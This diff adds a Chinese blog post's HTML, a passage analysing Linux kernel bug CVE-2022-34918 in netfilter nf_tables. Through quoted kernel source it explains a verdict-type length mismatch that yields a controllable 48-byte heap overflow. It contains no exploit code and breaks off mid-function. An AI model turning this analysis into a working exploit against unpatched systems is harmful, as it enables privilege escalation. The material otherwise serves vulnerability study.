@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
+        
+      <meta name="description" content="Boom? PWN ! ! !" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>Dig into Netfilter (四) —— CVE-2022-34918 |  北极落小雪</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+  </html>
+</html>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Dig into Netfilter (4)"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Dig into Netfilter (四) —— CVE-2022-34918
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/Dig%20into%20Netfilter%20(4)/" class="article-date">
+  <time datetime="2024-12-09T16:00:00.000Z" itemprop="datePublished">2024-12-10</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/Kernel/">Kernel</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">14 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h3 id="CVE-2022-34918"><a href="#CVE-2022-34918" class="headerlink" title="CVE-2022-34918"></a>CVE-2022-34918</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在nft_set_elem_init函数中, 有几处使用memcpy的地方让人眼前一亮.<br>众所周知审溢出就是审读写时使用的大小是否小于等于分配内存时使用的大小.</p>
+<p>但这几处分配空间使用的是tmpl-&gt;len, 而写入的长度是(set-&gt;klen + set-&gt;klen + set-&gt;dlen) (对应属性都存在的情况下), 这促使我们向上回溯看看这些值之间是否存在上述小于等于的关系.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">nft_set_elem_init</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_set *<span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="keyword">struct</span> nft_set_ext_tmpl *tmpl,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> u32 *key, <span class="type">const</span> u32 *key_end,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> u32 *data, u64 timeout, u64 expiration, <span class="type">gfp_t</span> gfp)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span>;</span></span><br><span class="line">	<span class="type">void</span> *elem;</span><br><span class="line"></span><br><span class="line">	elem = kzalloc(<span class="built_in">set</span>-&gt;ops-&gt;elemsize + tmpl-&gt;len, gfp);</span><br><span class="line">	<span class="keyword">if</span> (elem == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	ext = nft_set_elem_ext(<span class="built_in">set</span>, elem);</span><br><span class="line">	nft_set_ext_init(ext, tmpl);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_KEY))</span><br><span class="line">		<span class="built_in">memcpy</span>(nft_set_ext_key(ext), key, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_KEY_END))</span><br><span class="line">		<span class="built_in">memcpy</span>(nft_set_ext_key_end(ext), key_end, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))</span><br><span class="line">		<span class="built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="built_in">set</span>-&gt;dlen);</span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_EXPIRATION)) {</span><br><span class="line">		*nft_set_ext_expiration(ext) = get_jiffies_64() + expiration;</span><br><span class="line">		<span class="keyword">if</span> (expiration == <span class="number">0</span>)</span><br><span class="line">			*nft_set_ext_expiration(ext) += timeout;</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_TIMEOUT))</span><br><span class="line">		*nft_set_ext_timeout(ext) = timeout;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> elem;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<span id="more"></span>
+
+<p>tmpl结构是在nft_add_set_elem函数中逐渐填充修改的, 该函数是为set添加一个元素.<br>比如如果指定了NFTA_SET_ELEM_KEY, 那么会调用nft_set_ext_add_length, 将tmpl-&gt;len增加set-&gt;klen的长度, 并设置对应的offset字段.</p>
+<p>下面是一些相关的代码片段(只考虑与上述三个memcpy相关的元素属性).</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_KEY]) {</span><br><span class="line">	err = nft_setelem_parse_key(ctx, <span class="built_in">set</span>, &amp;elem.key.val,</span><br><span class="line">				    nla[NFTA_SET_ELEM_KEY]);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"></span><br><span class="line">	nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_KEY_END]) {</span><br><span class="line">	err = nft_setelem_parse_key(ctx, <span class="built_in">set</span>, &amp;elem.key_end.val,</span><br><span class="line">				    nla[NFTA_SET_ELEM_KEY_END]);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_parse_key;</span><br><span class="line"></span><br><span class="line">	nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_KEY_END, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (num_exprs) {</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_exprs; i++)</span><br><span class="line">		size += expr_array[i]-&gt;ops-&gt;size;</span><br><span class="line"></span><br><span class="line">	nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_EXPRESSIONS,</span><br><span class="line">			       <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_set_elem_expr) +</span><br><span class="line">			       size);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_DATA] != <span class="literal">NULL</span>) {</span><br><span class="line">	err = nft_setelem_parse_data(ctx, <span class="built_in">set</span>, &amp;desc, &amp;elem.data.val,</span><br><span class="line">				     nla[NFTA_SET_ELEM_DATA]);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_parse_key_end;</span><br><span class="line"></span><br><span class="line">	dreg = nft_type_to_reg(<span class="built_in">set</span>-&gt;dtype);</span><br><span class="line">	list_for_each_entry(binding, &amp;<span class="built_in">set</span>-&gt;bindings, <span class="built_in">list</span>) {</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">bind_ctx</span> =</span> {</span><br><span class="line">			.net	= ctx-&gt;net,</span><br><span class="line">			.family	= ctx-&gt;family,</span><br><span class="line">			.table	= ctx-&gt;table,</span><br><span class="line">			.chain	= (<span class="keyword">struct</span> nft_chain *)binding-&gt;chain,</span><br><span class="line">		};</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!(binding-&gt;flags &amp; NFT_SET_MAP))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		err = nft_validate_register_store(&amp;bind_ctx, dreg,</span><br><span class="line">						  &amp;elem.data.val,</span><br><span class="line">						  desc.type, desc.len);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> err_parse_data;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (desc.type == NFT_DATA_VERDICT &amp;&amp;</span><br><span class="line">		    (elem.data.val.verdict.code == NFT_GOTO ||</span><br><span class="line">		     elem.data.val.verdict.code == NFT_JUMP))</span><br><span class="line">			nft_validate_state_update(ctx-&gt;net,</span><br><span class="line">						  NFT_VALIDATE_NEED);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	nft_set_ext_add_length(&amp;tmpl, NFT_SET_EXT_DATA, desc.len);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elem.priv = nft_set_elem_init(<span class="built_in">set</span>, &amp;tmpl, elem.key.val.data,</span><br><span class="line">			      elem.key_end.val.data, elem.data.val.data,</span><br><span class="line">			      timeout, expiration, GFP_KERNEL);</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>可以发现, tmpl的len 大致是 (set-&gt;klen + set-&gt;klen + desc.len) (只考虑与上述三个memcpy相关的元素属性). 即在解析NFTA_SET_ELEM_DATA时预留的空间是desc.len而不是memcpy时使用的set-&gt;dlen, 于是继续分析desc的解析过程.</p>
+<p>nft_setelem_parse_data函数:</p>
+<ul>
+<li>首先调用nft_data_init函数从nla[NFTA_SET_ELEM_DATA]中解析出nft_data和对应的nft_data_desc. </li>
+<li>判断desc-&gt;type, 如果不是NFT_DATA_VERDICT则比较desc-&gt;len 与 set-&gt;dlen.</li>
+</ul>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nft_setelem_parse_data</span><span class="params">(<span class="keyword">struct</span> nft_ctx *ctx, <span class="keyword">struct</span> nft_set *<span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">				  <span class="keyword">struct</span> nft_data_desc *desc,</span></span><br><span class="line"><span class="params">				  <span class="keyword">struct</span> nft_data *data,</span></span><br><span class="line"><span class="params">				  <span class="keyword">struct</span> nlattr *attr)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = nft_data_init(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (desc-&gt;type != NFT_DATA_VERDICT &amp;&amp; desc-&gt;len != <span class="built_in">set</span>-&gt;dlen) {</span><br><span class="line">		nft_data_release(data, desc-&gt;type);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>nft_data有两种类型,  VALUE和VERDICT, 对应两种nft_data_desc, 对于前者大小可达NFT_DATA_VALUE_MAXLEN(64字节), 对于后者大小为固定的16字节.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_data</span> {</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> {</span></span><br><span class="line">		u32			data[<span class="number">4</span>];</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">nft_verdict</span>	<span class="title">verdict</span>;</span></span><br><span class="line">	};</span><br><span class="line">} __attribute__((aligned(__alignof__(u64))));</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">nft_data_init</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_ctx *ctx,</span></span><br><span class="line"><span class="params">		  <span class="keyword">struct</span> nft_data *data, <span class="type">unsigned</span> <span class="type">int</span> size,</span></span><br><span class="line"><span class="params">		  <span class="keyword">struct</span> nft_data_desc *desc, <span class="type">const</span> <span class="keyword">struct</span> nlattr *nla)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">NFTA_DATA_MAX</span> + 1];</span></span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = nla_parse_nested_deprecated(tb, NFTA_DATA_MAX, nla,</span><br><span class="line">					  nft_data_policy, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tb[NFTA_DATA_VALUE])</span><br><span class="line">		<span class="keyword">return</span> nft_value_init(ctx, data, size, desc,</span><br><span class="line">				      tb[NFTA_DATA_VALUE]);</span><br><span class="line">	<span class="keyword">if</span> (tb[NFTA_DATA_VERDICT] &amp;&amp; ctx != <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> nft_verdict_init(ctx, data, desc, tb[NFTA_DATA_VERDICT]);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>分析完了, 再来看看把desc-&gt;len和set-&gt;dlen关联上的判断, 其实问题很明显了, 如果desc-&gt;type是NFT_DATA_VERDICT, 那么desc-&gt;len就可以小于(不等于)set-&gt;dlen, 这就可能在memcpy时造成溢出.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (desc-&gt;type != NFT_DATA_VERDICT &amp;&amp; desc-&gt;len != <span class="built_in">set</span>-&gt;dlen)</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><p>继续分析这个溢出, set-&gt;dlen的限制是NFT_DATA_VALUE_MAXLEN(64字节), 而NFT_DATA_VERDICT的空间是固定的16字节, 那么溢出的最大长度为48字节.<br>溢出的destination是GFP_KERNEL的堆上对象, 同时我们能布置 nft_set_ext_data(ext)在该对象内存的末尾(这与nft_add_set_elem函数中调用nft_set_ext_add_length的顺序有关)</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">	elem.priv = nft_set_elem_init(<span class="built_in">set</span>, &amp;tmpl, elem.key.val.data,</span><br><span class="line">				      elem.key_end.val.data, elem.data.val.data,</span><br><span class="line">				      timeout, expiration, GFP_KERNEL);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">nft_set_elem_init</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_set *<span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="keyword">struct</span> nft_set_ext_tmpl *tmpl,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> u32 *key, <span class="type">const</span> u32 *key_end,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> u32 *data, u64 timeout, u64 expiration, <span class="type">gfp_t</span> gfp)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span>;</span></span><br><span class="line">	<span class="type">void</span> *elem;</span><br><span class="line"></span><br><span class="line">	elem = kzalloc(<span class="built_in">set</span>-&gt;ops-&gt;elemsize + tmpl-&gt;len, gfp);</span><br><span class="line">	<span class="keyword">if</span> (elem == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	ext = nft_set_elem_ext(<span class="built_in">set</span>, elem);</span><br><span class="line">	nft_set_ext_init(ext, tmpl);</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))</span><br><span class="line">		<span class="built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="built_in">set</span>-&gt;dlen);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> elem;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>而溢出的source是elem.data.val.data, 这是nft_setelem_parse_data函数解析的结果.<br>由于我们设置了desc-&gt;type为NFT_DATA_VERDICT, 这意味着我们对elem.data.val.data没有完全的控制能力, 且能控制的长度也不超过sizeof(nft_data), 而这其实就是完全没有控制能力. </p>
+<p>仿佛这个溢出的能力就是将最多48字节杂乱的值在堆中越界写入.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct nft_set_elem - generic representation of set elements</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *	@key: element key</span></span><br><span class="line"><span class="comment"> *	@key_end: closing element key</span></span><br><span class="line"><span class="comment"> *	@priv: element private data and extensions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_elem</span> {</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> {</span></span><br><span class="line">		u32		buf[NFT_DATA_VALUE_MAXLEN / <span class="keyword">sizeof</span>(u32)];</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">nft_data</span>	<span class="title">val</span>;</span></span><br><span class="line">	} key;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> {</span></span><br><span class="line">		u32		buf[NFT_DATA_VALUE_MAXLEN / <span class="keyword">sizeof</span>(u32)];</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">nft_data</span>	<span class="title">val</span>;</span></span><br><span class="line">	} key_end;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> {</span></span><br><span class="line">		u32		buf[NFT_DATA_VALUE_MAXLEN / <span class="keyword">sizeof</span>(u32)];</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">nft_data</span> <span class="title">val</span>;</span></span><br><span class="line">	} data;</span><br><span class="line">	<span class="type">void</span>			*priv;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>但elem字段并没有进行初始化, 而在nf_tables_newsetelem函数中, 会循环调用nft_add_set_elem处理用户提供的nla[NFTA_SET_ELEM_LIST_ELEMENTS]属性.<br>这意味着在多次nft_add_set_elem中, elem结构中会残留上一次处理的数据, 而该数据对于NFT_DATA_VALUE类型来说是完全可控的. 于是我们就有了完全可控的48字节堆溢出.<br>(不得不感叹: “漏洞利用是需要缘分的”)</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nft_add_set_elem</span><span class="params">(<span class="keyword">struct</span> nft_ctx *ctx, <span class="keyword">struct</span> nft_set *<span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">			    <span class="type">const</span> <span class="keyword">struct</span> nlattr *attr, u32 nlmsg_flags)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr_array</span>[<span class="title">NFT_SET_EXPR_MAX</span>] =</span> {};</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nla</span>[<span class="title">NFTA_SET_ELEM_MAX</span> + 1];</span></span><br><span class="line">	u8 genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line">	u32 flags = <span class="number">0</span>, size = <span class="number">0</span>, num_exprs = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext_tmpl</span> <span class="title">tmpl</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span>, *<span class="title">ext2</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_set_elem</span> <span class="title">elem</span>;</span></span><br><span class="line">......</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nf_tables_newsetelem</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">				<span class="type">const</span> <span class="keyword">struct</span> nfnl_info *info,</span></span><br><span class="line"><span class="params">				<span class="type">const</span> <span class="keyword">struct</span> nlattr * <span class="type">const</span> nla[])</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(info-&gt;net);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line">	u8 genmask = nft_genmask_next(info-&gt;net);</span><br><span class="line">	u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">	<span class="type">int</span> rem, err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_SET_ELEM_LIST_ELEMENTS] == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	table = nft_table_lookup(net, 